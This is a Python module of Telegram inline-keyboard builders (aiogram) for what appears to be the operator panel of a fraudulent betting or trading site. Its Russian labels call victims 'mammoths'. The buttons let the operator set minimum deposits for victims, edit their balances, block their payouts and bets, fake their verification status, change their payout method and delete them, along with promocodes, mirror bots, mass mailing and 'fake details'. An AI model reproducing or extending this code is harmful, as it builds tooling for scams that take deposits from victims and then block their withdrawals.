import requests

from aiogram.utils.keyboard import InlineKeyboardBuilder

from config import URL


def get_clava_setting_website(telegram_id):
    site_settings = requests.get(f"{URL}/api/bot/settingapp/{telegram_id}").json()
    admin_settings = requests.post(f"{URL}/api/bot/admin/{telegram_id}").json()

    min_deposit = site_settings["min_deposit"]
    min_output = site_settings["min_output"]
    stop_limit = site_settings["stop_limit"]
    notifications = ["❌", "✅"][site_settings["notifications"]]
    notifications_bet = ["❌", "✅"][site_settings["notifications_bet"]]
    referal_promocode = admin_settings["word"]
    referal_percent = admin_settings["bonus"]
    set_btns = [
        ["minimum_deposit", f"Минимальный депозит для мамонта: {min_deposit} RUB"],
        ["min_output", f"Минимальный вывод для мамонта: {min_output} RUB"],
        [["create_promo_choose", "Создать промокод"], ["show_promos", "Мои промокоды"]],
        ["stop_limit", f"Стоп-лимит: {stop_limit} RUB"],
        ["site_notifications", f"{notifications} Уведомления"],
        ["site_notifications_bet", f"{notifications_bet} Уведомление о ставках"],
        [
            "edit_referal_promocode",
            f"💝 Изменить реферальный промокод: {referal_promocode}",
        ],
        [
            "edit_referal_percent",
            f"🎁 Изменить реферальный процент: {referal_percent}%",
        ],
        [["pluger", "🇺🇦"], ["pluger", "🇰🇿"]],
        ["main_menu", "Назад 🔙"],
    ]

    builder = InlineKeyboardBuilder()
    for index in range(len(set_btns)):
        if type(set_btns[index][0]) == type([]):
            for index_nested in range(len(set_btns[index][0])):
                builder.button(
                    text=set_btns[index][index_nested][1],
                    callback_data=set_btns[index][index_nested][0],
                )
        else:
            builder.button(
                text=set_btns[index][1],
                callback_data=set_btns[index][0],
            )
    builder.adjust(1, 1, 2, 1, 1, 1, 1, 1, 2, 1)

    return builder.as_markup()


#


def get_clava_mammoth_on_site(telegram_id):
    response = requests.get(f"{URL}/api/bot/user/{telegram_id}")
    if response.ok:
        set_users = [[i["id"], i["login"]] for i in response.json()]
    else:
        set_users = []

    set_btns = [
        [["1", "◀️"], ["1", "1/1"], ["1", "▶️"]],
        ["mammoth_management", "Назад 🔙"],
    ]

    builder_users = InlineKeyboardBuilder()
    for user in set_users:
        builder_users.button(
            text=f"{user[0]} | {user[1]}",
            callback_data="management_user_" + str(user[0]),
        )

    builder_btns = InlineKeyboardBuilder()
    for btn in set_btns:
        if type(btn[0]) == type([]):
            for index_nested in range(len(btn)):
                builder_btns.button(
                    text=btn[index_nested][1],
                    callback_data=btn[index_nested][0],
                )
        else:
            builder_btns.button(
                text=btn[1],
                callback_data=btn[0],
            )

    builder_users.adjust(1)
    builder_btns.adjust(3, 1)

    return builder_users.attach(builder_btns).as_markup()


#


def get_clava_management_user(user_info):
    block_payout = ["🔒 Разблокировать", "🔓 Заблокировать"][
        not user_info["block_payout"]
    ]
    block_bet = ["🔒 Разблокировать", "🔓 Заблокировать"][not user_info["block_bet"]]
    verification = ["❌", "✅"][user_info["verification"]]
    set_btns = [
        ["mammoth_edit_balance", "💰 Баланс"],
        ["mammoth_block_payout", f"{block_payout} вывод 💸"],
        ["mammoth_change_payout_method", "💸 Изменить метод вывода"],
        ["mammoth_block_bet", f"{block_bet} ставки 📊"],
        ["mammoth_change_verification", f"{verification} Верификация"],
        ["pluger", "🔔 Отправлять уведомления"],
        ["mammoth_delete", "🗑 Удалить🐘"],
        ["mammoth_on_site", "Назад 🔙"],
    ]

    builder = InlineKeyboardBuilder()
    for index in range(len(set_btns)):
        if type(set_btns[index][0]) == type([]):
            for index_nested in range(len(set_btns[index][0])):
                builder.button(
                    text=set_btns[index][index_nested][1],
                    callback_data=set_btns[index][index_nested][0],
                )
        else:
            builder.button(
                text=set_btns[index][1],
                callback_data=set_btns[index][0],
            )
    builder.adjust(1)

    return builder.as_markup()


#


def get_clava_fake_details(user_info):
    block_payout = ["🔒 Разблокировать", "🔓 Заблокировать"][
        not user_info["block_payout"]
    ]
    block_bet = ["🔒 Разблокировать", "🔓 Заблокировать"][not user_info["block_bet"]]
    verification = ["❌", "✅"][user_info["verification"]]
    set_btns = [
        ["mammoth_edit_balance", "💰 Баланс"],
        ["mammoth_block_payout", f"{block_payout} вывод 💸"],
        ["mammoth_change_payout_method", "💸 Изменить метод вывода"],
        ["mammoth_block_bet", f"{block_bet} ставки 📊"],
        ["mammoth_change_verification", f"{verification} Верификация"],
        ["pluger", "🔔 Отправлять уведомления"],
        ["mammoth_delete", "🗑 Удалить🐘"],
        ["mammoth_on_site", "Назад 🔙"],
    ]

    builder = InlineKeyboardBuilder()
    for index in range(len(set_btns)):
        if type(set_btns[index][0]) == type([]):
            for index_nested in range(len(set_btns[index][0])):
                builder.button(
                    text=set_btns[index][index_nested][1],
                    callback_data=set_btns[index][index_nested][0],
                )
        else:
            builder.button(
                text=set_btns[index][1],
                callback_data=set_btns[index][0],
            )
    builder.adjust(1)

    return builder.as_markup()


#


def get_clava_promos(telegram_id):
    response = requests.get(f"{URL}/api/bot/promocode/{telegram_id}")
    if response.ok:
        set_promos = [
            [i["id"], i["word"], i["type"], i["bonus"], i["count"]]
            for i in response.json()
        ]
    else:
        set_promos = []

    set_btns = [
        [["1", "◀️"], ["1", "1/1"], ["1", "▶️"]],
        ["setting_website", "Назад 🔙"],
    ]

    builder_promos = InlineKeyboardBuilder()
    for promo in set_promos:
        typ = ["RUB", "%"][promo[2] != "Баланс"]
        builder_promos.button(
            text=f"{promo[1]} | {promo[3]}{typ} | {promo[4]}",
            callback_data="promocode_" + str(promo[0]),
        )

    builder_btns = InlineKeyboardBuilder()
    for btn in set_btns:
        if type(btn[0]) == type([]):
            for index_nested in range(len(btn)):
                builder_btns.button(
                    text=btn[index_nested][1],
                    callback_data=btn[index_nested][0],
                )
        else:
            builder_btns.button(
                text=btn[1],
                callback_data=btn[0],
            )

    builder_promos.adjust(1)
    builder_btns.adjust(3, 1)

    return builder_promos.attach(builder_btns).as_markup()


#


def get_clava_setting_bot(telegram_id):
    response = requests.get(f"{URL}/api/bot/settingbot/{telegram_id}")
    count_signals = response.json()["count_signals"]
    referal_system = ["❌", "✅"][response.json()["referal_system"]]
    set_btns = [
        ["massive_sendler", "Массовая рассылка 📢"],
        ["bot_count_signals", f"Кол-во сигналов: {count_signals}"],
        ["bot_uppdate_signals", "Обновить сигналы без очереди"],
        ["bot_change_support", f"Изменить поддержку бота: нет"],
        ["delete_bot_support", "Удалить поддержку бота"],
        ["bot_referal_system", f"{referal_system} Реферальная система мамонтов"],
        ["main_menu", "Назад 🔙"],
    ]

    builder = InlineKeyboardBuilder()
    for index in range(len(set_btns)):
        if type(set_btns[index][0]) == type([]):
            for index_nested in range(len(set_btns[index][0])):
                builder.button(
                    text=set_btns[index][index_nested][1],
                    callback_data=set_btns[index][index_nested][0],
                )
        else:
            builder.button(
                text=set_btns[index][1],
                callback_data=set_btns[index][0],
            )
    builder.adjust(1)

    return builder.as_markup()


#


def get_clava_add_mirror_bot(telegram_id):
    response = requests.get(f"{URL}/api/bot/mirror/{telegram_id}")
    if response.ok:
        set_bots = [[i["url"], i["token"]] for i in response.json()]
    else:
        set_bots = []
    set_btns = [
        ["bot_add_processing", "➕"],
        ["mirrors", "Назад 🔙"],
    ]

    builder_bots = InlineKeyboardBuilder()
    for bot in set_bots:
        builder_bots.button(
            text=f"{bot[0]}",
            callback_data="setting_botik_" + bot[1],
        )

    builder_btns = InlineKeyboardBuilder()
    for btn in set_btns:
        if type(btn[0]) == type([]):
            for index_nested in range(len(btn)):
                builder_btns.button(
                    text=btn[index_nested][1],
                    callback_data=btn[index_nested][0],
                )
        else:
            builder_btns.button(
                text=btn[1],
                callback_data=btn[0],
            )

    builder_bots.adjust(1)
    builder_btns.adjust(1)

    return builder_bots.attach(builder_btns).as_markup()


#


def get_clava_setting_botik(telegram_id, token):
    response = requests.get(f"{URL}/api/bot/mirror/{telegram_id}")

    set_btns = [
        [f"delete_botik_" + token, "❌ Удалить"],
        ["add_mirror_bot", "Назад 🔙"],
    ]

    builder_btns = InlineKeyboardBuilder()
    for btn in set_btns:
        if type(btn[0]) == type([]):
            for index_nested in range(len(btn)):
                builder_btns.button(
                    text=btn[index_nested][1],
                    callback_data=btn[index_nested][0],
                )
        else:
            builder_btns.button(
                text=btn[1],
                callback_data=btn[0],
            )

    builder_btns.adjust(1)

    return builder_btns.as_markup()


#
